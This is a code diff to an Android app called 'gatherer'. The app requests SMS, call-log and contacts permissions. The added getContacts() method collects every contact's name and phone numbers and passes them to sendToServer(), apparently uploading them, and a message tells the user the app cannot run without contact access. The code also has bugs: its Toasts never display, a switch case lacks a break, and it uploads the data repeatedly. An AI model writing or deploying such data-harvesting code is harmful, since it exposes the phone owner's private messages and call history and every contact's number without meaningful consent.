@@ -1,10 +1,13 @@
 package com.example.alex.gatherer;
 
 import android.Manifest;
+import android.content.ContentResolver;
 import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.StrictMode;
+import android.provider.ContactsContract;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
 import android.support.v4.content.ContextCompat;
@@ -14,6 +17,7 @@ import android.view.View;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.database.Cursor;
+import android.widget.Toast;
 
 import com.example.alex.gatherer.R;
 
@@ -31,6 +35,7 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int READ_TEXTS_PERMISSIONS_REQUEST = 1;
     private static final int READ_CALLS_PERMISSIONS_REQUEST = 2;
+    private static final int REQ_READ_CONTACTS = 100;
 
 
 
@@ -46,9 +51,12 @@ public class MainActivity extends AppCompatActivity {
         // request text access
         requestPermissions(new String[]{Manifest.permission.READ_SMS},
                 READ_TEXTS_PERMISSIONS_REQUEST);
-        // request text access
+        // request call log access
         requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG},
                 READ_CALLS_PERMISSIONS_REQUEST);
+        //request contacts access
+        requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},
+                REQ_READ_CONTACTS);
 
     }
 
@@ -148,10 +156,54 @@ public class MainActivity extends AppCompatActivity {
 
                 return;
             }
+            case REQ_READ_CONTACTS:
+                if(grantResults[0] == PackageManager.PERMISSION_GRANTED){
+                    getContacts();
+                }
+                else{
+                    Toast.makeText(getApplicationContext(), "Cannot run app without access to contacts.", Toast.LENGTH_LONG);
+                }
 
             // other 'case' lines to check for other
             // permissions this app might request
         }
+    }
+
+    protected void getContacts(){
+            ContentResolver cr = getContentResolver();
+            Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                    null, null, null, null);
+            if(phone == null){
+                Toast.makeText(getApplicationContext(), "ERROR could not create cursor.", Toast.LENGTH_LONG);
+                return;
+            }
+            Cursor conCursor;
+            String id, name, number;
+            String contact = "";
+            while(phone != null && phone.moveToNext()){
+                name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));
+
+                contact += name + ":";
+
+                if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
+                    conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id},
+                            null);
+                    while(conCursor.moveToNext()){
+                        number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                        contact += number + " ";
+                    }
+                    conCursor.close();
+                }
+                contact += '\n';
+                sendToServer(contact);
+
+
+            }
+            phone.close();
     }
 
 
